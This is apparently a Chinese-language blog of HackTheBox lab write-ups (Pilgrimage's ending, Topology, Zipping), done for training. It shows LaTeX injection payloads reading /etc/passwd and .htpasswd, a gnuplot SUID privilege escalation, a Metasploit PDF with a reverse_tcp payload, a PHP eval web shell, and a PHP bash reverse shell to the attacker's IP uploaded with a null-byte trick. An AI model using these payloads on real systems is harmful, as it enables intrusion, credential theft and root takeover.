<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /home/emily/exxxp.png /var/www/pilgrimage.htb/shrunk/ </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个应该无所谓，当文件上传上去的时候，就已经出发了</span></span><br></pre></td></tr></table></figure>

<p>攻击者终端上，(反应很慢啊)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nc -lvnp 4444        </span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">scp exxxp.png emily@10.10.11.219:/home/emilyconnect to [10.10.14.53] from (UNKNOWN) [10.10.11.219] 38604</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!sh </span><br><span class="line">/root/quarantine</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">_exxxp.png.extracted</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root/quarantine</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">quarantine</span><br><span class="line">reset.sh</span><br><span class="line">root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>.git的源码泄露，以及git-dumper工具的使用</p>
<p>user的漏洞利用，这个和代码逻辑有关，现在理解了也忘，算了</p>
<p>root的漏洞利用</p>
<p>通过<code>scp</code>上传本地文件到目标终端</p>
<p>会根据应用程序的版本，找现有的exp即可</p>
<h3 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.213.se/pilgrimage-hackthebox/">https://blog.213.se/pilgrimage-hackthebox/</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@jayeshgaba/hackthebox-writeup-pilgrimage-1084d1ae8970">https://medium.com/@jayeshgaba/hackthebox-writeup-pilgrimage-1084d1ae8970</a></p>
</blockquote>
<h2 id="9-Topology"><a href="#9-Topology" class="headerlink" title="9.Topology"></a>9.Topology</h2><h3 id="user-4"><a href="#user-4" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口扫描</span></span><br><span class="line">nmap -sT --min-rate 10000 -Pn -p- 10.10.11.217</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">22和80端口</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">细节扫描</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,80 -Pn 10.10.11.217              </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 10:05 CST</span><br><span class="line">Nmap scan report for 10.10.11.217</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)</span><br><span class="line">|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)</span><br><span class="line">|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Miskatonic University | Topology Group</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007102747437.png"></p>
<p>这里有个链接，去点一下，访问不了</p>
<p><code>vim /etc/hosts</code> 添加那个域名后，再访问一遍</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007103023495.png"></p>
<p>访问&#x2F;equation.php</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007103119991.png"></p>
<p>就是将输入以图片形式输出</p>
<p><code>?equ=123</code> 显示123的格式，以png格式输出</p>
<p>这是个什么嘞，这里也不存在sql注入的样子</p>
<p>爆破了路径，未果</p>
<p>谷歌一下 <code>latex equation generator</code></p>
<p>有个名词叫 <code>latex injection</code> </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection</a></p>
</blockquote>
<p>看一下效果</p>
<p>构造 <code>\immediate\write18&#123;whoami&#125;</code>、<code>\input&#123;output&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007115531255.png"></p>
<p>尝试其它的语句</p>
<p><code>$\lstinputlisting&#123;/etc/passwd&#125;$</code>，出现</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007125826620.png"></p>
<p>有一个bin&#x2F;bash的用户 <code>vdaisley</code></p>
<p>它的密码怎么搞，&#x2F;etc&#x2F;shadow不存在诶，那咋办，我也不知道去哪个文件找啊</p>
<p>既然有一个latex，有么有其它的，尝试下子域名枚举嘞</p>
<p>dnsenum报错，哎，看wp，</p>
<p>找到了个dev子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\lstinputlisting&#123;/var/www/dev/.htaccess&#125;$</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007141953766.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\lstinputlisting&#123;/var/www/dev/.htpasswd&#125;$</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007142121943.png" alt="calculus20"></p>
<p>使用john，碰撞一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/john/rockyou.txt hash.txt </span><br></pre></td></tr></table></figure>

<p>跑出来了诶！！！！字典nb</p>
<p><strong>ssh连接</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ ls</span><br><span class="line">linpeas.sh  plt.plt  pspy64  report.txt  test.plt  user.txt  wget-log</span><br><span class="line">-bash-5.0$ cat user.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">尝试sudo提取，没有</span></span><br><span class="line">-bash-5.0$ sudo -l</span><br><span class="line">[sudo] password for vdaisley: </span><br><span class="line">Sorry, user vdaisley may not run sudo on topology.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="root-4"><a href="#root-4" class="headerlink" title="root"></a>root</h3><p>kali终端再上传一个pspy64</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /root/桌面/pspy64 vdaisle@10.10.11.217</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还可以怎么传？</p>
<p>让kali用python启动一个http服务，在入侵的shell下使用wget去下载</p>
</blockquote>
<p>这边的shell下可以看到上传成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ pwd</span><br><span class="line">/home/vdaisley</span><br><span class="line">-bash-5.0$ ls</span><br><span class="line">linpeas.sh  plt.plt  pspy64  report.txt  test.plt  user.txt  wget-log</span><br><span class="line">-bash-5.0$ pspy64</span><br><span class="line">-bash: pspy64: command not found</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行下</span></span><br><span class="line">-bash-5.0$ ./pspy64</span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到了一个&#x2F;bin&#x2F;sh 的文件夹，<code>gnuplot</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231007143615094.png"></p>
<p>谷歌一下 gnuplot</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/</a></p>
</blockquote>
<p>大意就是，利用这个脚本文件去执行一个.plt文件，而这个文件内容可以写一些提权的内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.0$ <span class="built_in">echo</span> <span class="string">&quot;system &#x27;chmod u+s /bin/bash&#x27;&quot;</span> &gt; /opt/gnuplot/hacked.plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#它试图设置 /bin/bash 的用户特权位（SetUID），这将允许任何以该 Shell 启动的进程以拥有 /bin/bash 文件所有者的权限运行</span></span><br><span class="line"></span><br><span class="line">-bash-5.0$ <span class="built_in">pwd</span></span><br><span class="line">/home/vdaisley</span><br><span class="line">-bash-5.0$ <span class="built_in">cd</span> /opt/gunplot</span><br><span class="line">-bash: <span class="built_in">cd</span>: /opt/gunplot: No such file or directory</span><br><span class="line">-bash-5.0$ <span class="built_in">cd</span> /opt/gnuplot</span><br><span class="line">-bash-5.0$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">-bash-5.0$ <span class="built_in">ls</span> -a</span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">-bash-5.0$ <span class="built_in">ls</span> -la /opt/gnuplot/hacked.plt</span><br><span class="line">-rw-rw-r-- 1 vdaisley vdaisley 29 Oct  7 02:42 /opt/gnuplot/hacked.plt</span><br><span class="line">-bash-5.0$ bash -p</span><br><span class="line"></span><br><span class="line"><span class="comment">#用户可以以具有 root 权限的方式运行 Bash Shell。 -p 选项告诉 Bash 启动一个特权 Shell，允许用户执行以 root 权限运行的命令，从而实现了提权</span></span><br><span class="line"></span><br><span class="line">bash-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0<span class="comment"># ls</span></span><br><span class="line">getdata.sh  hacked.plt  loaddata.dat  loadplot.plt  netdata.dat  networkplot.plt</span><br><span class="line">bash-5.0<span class="comment"># pwd</span></span><br><span class="line">/opt/gnuplot</span><br><span class="line">bash-5.0<span class="comment"># cd /</span></span><br><span class="line">bash-5.0<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr</span><br><span class="line">boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line">bash-5.0<span class="comment"># cat root</span></span><br><span class="line"><span class="built_in">cat</span>: root: Is a directory</span><br><span class="line">bash-5.0<span class="comment"># cd root</span></span><br><span class="line">bash-5.0<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">bash-5.0<span class="comment"># cat root.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@Char0n_0x04/topology-htb-1e4cf07d7805">https://medium.com/@Char0n_0x04/topology-htb-1e4cf07d7805</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@error.not.known.404/topology-easy-ctf-hackthebox-99b485c380dc">https://medium.com/@error.not.known.404/topology-easy-ctf-hackthebox-99b485c380dc</a></p>
</blockquote>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p><strong>user</strong></p>
<p>对于不熟悉的术语，多去谷歌，就像这个LaTex，没准存在现有的漏洞利用</p>
<p>LaTex是一种排版系统，以其出色的排版质量和对复杂文档的支持而闻名</p>
<p>它支持的 <code>\input</code>等命令，攻击者构造恶意参数就可能实现攻击目的</p>
<p><strong>root</strong></p>
<p><strong>文件上传</strong>：当ssh连接到用户终端后，将本地文件上传的方式，有</p>
<blockquote>
<p>1.scp上传文件过去</p>
<p>2.攻击者搭建http服务器，在ssh到的用户终端上wget访问并下载即可</p>
</blockquote>
<p>没有sudo提权后，上传一个pspy64文件</p>
<blockquote>
<p>pspy64 使得在没有Root权限的情况下，监控linux进程</p>
</blockquote>
<p>发现后台中具有&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash的服务，加以利用</p>
<p>对于一个suid文件(如果一个文件的权限位中显示为 <code>-rwsr-xr-x</code>，那么它是一个具有 SUID 权限的文件)，这样的话，一个普通用户执行一个<strong>具有SUID权限</strong>的可执行文件时，该文件会以<strong>root用户</strong>身份运行</p>
<p><strong>bash -p</strong> ：用户可以以具有 root 权限的方式运行 Bash Shell。 <code>-p</code> 选项告诉 Bash 启动一个特权 Shell，允许用户执行以 root 权限运行的命令，从而实现了提权</p>
<h1 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h1><h2 id="Zipping-无效"><a href="#Zipping-无效" class="headerlink" title="Zipping(无效)"></a>Zipping(无效)</h2><p>user：自动解压缩的Zip 文件上传，但是我用了和wp的相似绕过方法，无法监听到，多次尝试，未果，放弃。</p>
<h3 id="user-5"><a href="#user-5" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口扫描</span></span><br><span class="line">nmap -sT --min-rate 10000 -p- 10.10.11.229</span><br><span class="line">22、80端口</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">详细扫描</span></span><br><span class="line">nmap -sT -sV -sC -O -p22,80 -Pn 10.10.11.229    </span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)</span><br><span class="line">|_  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))</span><br><span class="line">|_http-title: Zipping | Watch store</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 5.0 - 5.3 (92%), Adtran 424RG FTTH gateway (92%), Linux 3.10 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问 ，有两处地方，值得注意</p>
<blockquote>
<p>一个是Contack us，发邮箱联系的功能</p>
<p>一个是文件上传的地方，只允许上传zip文件，且只能<strong>包含一个</strong>pdf文件</p>
<p>一个shop商店</p>
</blockquote>
<p>上传后，网站会自解压</p>
<p>pdf怎么实现攻击呢，我先用的msf (失败了，直接跳过)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成一个pdf木马</span></span><br><span class="line"></span><br><span class="line">msf6 &gt; search cve-2010-2883</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者 search adobe_pdf 都失败了</span></span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                            Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 1</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set lhost 10.10.14.53</span><br><span class="line">lhost =&gt; 10.10.14.53</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/fileformat/adobe_cooltype_sing):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.14.53      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     8888             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set filename 0000.pdf</span><br><span class="line">filename =&gt; 0000.pdf</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Creating &#x27;0000.pdf&#x27; file...</span><br><span class="line">[+] 0000.pdf stored at /root/.msf4/local/0000.pdf</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">监听</span></span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.10.14.53</span><br><span class="line">lhost =&gt; 10.10.14.53</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 8888</span><br><span class="line">lhost =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.10.14.53</span><br><span class="line">lhost =&gt; 10.10.14.53</span><br><span class="line">msf6 exploit(multi/handler) &gt; set port 10.10.14.53</span><br><span class="line">[-] Unknown datastore option: port. Did you mean LPORT?</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.14.53      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     8888             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成了路径<code>uploads/17d1fd8f786834b20d699754fb83c503/0000.pdf</code>，访问后，<strong>没有触发监听</strong></p>
<p>尝试路径爆破，没结果</p>
<p>子域名爆破，没结果</p>
<p>看商店页面 <code>http://10.10.11.229/shop/index.php?page=product&amp;id=1</code>sql注入没结果</p>
<p>emmmm，怪嘞</p>
<p>回到文件上传的位置，试试apache的后缀解析漏洞呢？</p>
<p>我创建一个php文件，里面有一句话木马，然后文件重命名，1.php%00.pdf，我想问阁下如何应对？</p>
<p>内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后访问的是1.php%00.pdf，访问不了</p>
<p>去掉后面的%00.pdf呢，也访问不了</p>
<p><strong>bp方法</strong></p>
<p>我这样吧，将php内容换为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># cat mm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.53/7777 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#重命名</span></span><br><span class="line">mv mm.php mm.phpD.pdf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将文件上传后，在hex窗口下的D替换掉</p>
<p>尝试用hex窗口下44替换为00</p>
<p><img src="/../../../Typora/img111/image-20231008142806172.png"></p>
<p>kali设置nc监听，</p>
